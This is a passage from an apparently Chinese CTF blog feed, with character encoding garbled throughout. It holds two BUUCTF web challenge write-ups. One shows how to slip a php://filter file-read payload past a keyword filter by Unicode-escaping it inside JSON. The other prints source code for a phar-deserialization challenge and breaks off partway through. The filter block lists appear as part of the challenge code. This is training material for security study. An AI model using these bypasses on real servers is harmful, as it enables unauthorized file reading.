<li><strong>æ·»åŠ å™ªéŸ³å’Œæ— ç”¨ä»£ç ï¼š</strong> åœ¨ä»£ç ä¸­æ·»åŠ æ— ç”¨çš„è¯­å¥ã€æ³¨é‡Šæˆ–å‡½æ•°ï¼Œä½¿å…¶æ›´åŠ æ··ä¹±ï¼Œå¢åŠ ç†è§£çš„éš¾åº¦ã€‚</li>
</ol>
<h3 id="JavaScriptåæ··æ·†"><a href="#JavaScriptåæ··æ·†" class="headerlink" title="JavaScriptåæ··æ·†"></a>JavaScriptåæ··æ·†</h3><p>JavaScriptåæ··æ·†æ˜¯ä¸€ç§å°è¯•è¿˜åŸæ··æ·†ä»£ç çš„è¿‡ç¨‹ï¼Œä»¥ä¾¿æ›´å®¹æ˜“åœ°ç†è§£å’Œåˆ†æä»£ç ã€‚åæ··æ·†çš„ç›®æ ‡æ˜¯è¿˜åŸä»£ç çš„å¯è¯»æ€§ï¼Œä»¥ä¾¿äºå®¡æŸ¥ã€ç»´æŠ¤æˆ–é€†å‘å·¥ç¨‹ã€‚åæ··æ·†é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹ä¸€äº›æ–¹æ³•ï¼š</p>
<ol>
<li><strong>è¿˜åŸå˜é‡å’Œå‡½æ•°åï¼š</strong> å°†æ··æ·†è¿‡çš„å˜é‡åå’Œå‡½æ•°åè¿˜åŸä¸ºæ›´æœ‰æ„ä¹‰çš„åç§°ï¼Œä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</li>
<li><strong>ç®€åŒ–æ§åˆ¶æµï¼š</strong> é€šè¿‡ç§»é™¤æ— ç”¨çš„åˆ†æ”¯æˆ–è¿˜åŸåŸå§‹çš„æ§åˆ¶æµç¨‹ï¼Œä½¿ä»£ç æ›´æ˜“äºç†è§£ã€‚</li>
<li><strong>è§£å¯†å­—ç¬¦ä¸²å’Œå¸¸é‡ï¼š</strong> è§£å¯†åŠ å¯†çš„å­—ç¬¦ä¸²å’Œå¸¸é‡ï¼Œè¿˜åŸå®ƒä»¬çš„åŸå§‹å€¼ã€‚</li>
<li><strong>å»é™¤å™ªéŸ³å’Œæ— ç”¨ä»£ç ï¼š</strong> åˆ é™¤æ·»åŠ çš„æ— ç”¨è¯­å¥ã€æ³¨é‡Šæˆ–å‡½æ•°ï¼Œä»¥ç®€åŒ–ä»£ç ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WEBä¹‹[HarekazeCTF2019]encode_and_encode</title>
    <url>/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment">// no path traversal</span>
    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment">// no stream wrapper</span>
    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment">// no data exfiltration</span>
    <span class="token string single-quoted-string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//PHP è¾“å…¥æµä¸­è·å–è¯·æ±‚çš„ä¸»ä½“å†…å®¹</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>ifåˆ¤æ–­æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š<br>1ã€æ£€æµ‹ä¼ å…¥çš„å†…å®¹æ˜¯å¦åˆæ³•ä¹Ÿå°±æ˜¯<code>is_valid()</code>ï¼Œä¼ å…¥çš„å†…å®¹é‡Œé¢ä¸èƒ½å«æœ‰éæ³•å­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤filteråè®®<br>2ã€ä¼ å…¥çš„æ ¼å¼å°±æ˜¯jsonæ ¼å¼<br>3ã€ä¼ å…¥çš„å‚æ•°å°±æ˜¯page<br>ä¸‰ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³çš„è¯å°±ä¼šé€šè¿‡<code>file_get_contents</code>å¾—åˆ°è¯¥æ–‡ä»¶</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//è¿™é‡Œä¸ç»•è¿‡çš„è¯flagä¼šè¢«è¦†ç›–æ‰ï¼Œå› æ­¤ä½¿ç”¨filterä¼ªåè®®æ¥ç»•è¿‡ï¼ˆå°†å†…å®¹è¿›è¡Œbase64åŠ å¯†åflagå°±ä¸ä¼šè¢«è¦†ç›–äº†ï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>å› ä¸ºè¦è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯<code>is_valid()</code>å‡½æ•°å°†flagå’Œphpéƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯:</p>
<blockquote>
<p>phpçš„json_decodeåœ¨é‡åˆ°unicodeç¼–ç æ—¶ä¼šè‡ªåŠ¨æŠŠå®ƒè½¬æ¢æˆæ­£å¸¸çš„å­—ç¬¦</p>
</blockquote>
<p>é‚£ä¹ˆå°†<code>php://filter/read=convert.base64-encode/resource=/flag</code>è¿›è¡Œ<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicodeç¼–ç </a><br><img src="https://img-blog.csdnimg.cn/direct/b5998a581da445da9c4c4a1a7cecc9f3.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2b057cfdc190400485cb62914ac1568c.png" alt="789"><br>ç„¶åå°†flagè¿›è¡Œè§£ç ã€‚</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WEBä¹‹[SWPUCTF 2018]SimplePHP</title>
    <url>/2023/12/13/BUUCTF-WEB%E4%B9%8B-SWPUCTF-2018-SimplePHP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–ã€ä»£ç å®¡è®¡<br>å½“ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶çš„æ—¶å€™å‘ç°å¯ç–‘ç‚¹<code>http://120c99fe-157d-4ecc-8b63-b4198d09299f.node4.buuoj.cn:81/file.php?file=</code>è¯»å–index.phpæ–‡ä»¶çš„æ—¶å€™å‘ç°å¯ä»¥è¯»å–åˆ°æºç ï¼Œå°†æºç å…¨éƒ¨è¯»å–è¿‡æ¥ã€‚<br><img src="https://img-blog.csdnimg.cn/direct/e977ff1fc72743459855cc5407f146a4.png" alt="456"></p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string single-quoted-string">'base.php'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>å®šä½åˆ°base.php</p>
<h3 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>web3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>é¦–é¡µ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file.php?file=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æŸ¥çœ‹æ–‡ä»¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ä¸Šä¼ æ–‡ä»¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span> 
<span class="token comment">&lt;!--flag is in f1ag.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œè¾“å‡ºäº†ä¸€ä¸ªREMOTE_ADDRï¼Œä¹Ÿå°±æ˜¯æˆ‘çš„ipåœ°å€ã€‚ä¹Ÿå°±æ˜¯é¦–é¡µçš„IPã€‚ä¹Ÿå‘Šè¯‰äº†flagæ–‡ä»¶åç§°ï¼Œä¼°è®¡æ˜¯è®©è¿›è¡Œæ–‡ä»¶è¯»å–æ“ä½œ</p>
<blockquote>
<p>è¿™é‡Œéœ€è¦çŸ¥é“ï¼š<strong>REMOTE_ADDR åè®®å¤´æ˜¯ä¸å¯ä¼ªé€ çš„</strong></p>
</blockquote>
<p>æ‰€ä»¥æ¼æ´ç‚¹ä¸åœ¨è¿™é‡Œ</p>
<h3 id="file-php"><a href="#file-php" class="headerlink" title="file.php"></a>file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä½¿ç”¨<code>file_exists()</code>å‡½æ•°æ¥æ£€æµ‹<code>file</code>ä¼ å…¥çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°†æ–‡ä»¶èµ‹å€¼ç»™Showç±»çš„$sourceï¼Œå¹¶ä¸”è°ƒç”¨_show()æ–¹æ³•ï¼ŒShowç±»åœ¨classæ–‡ä»¶ä¸­ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
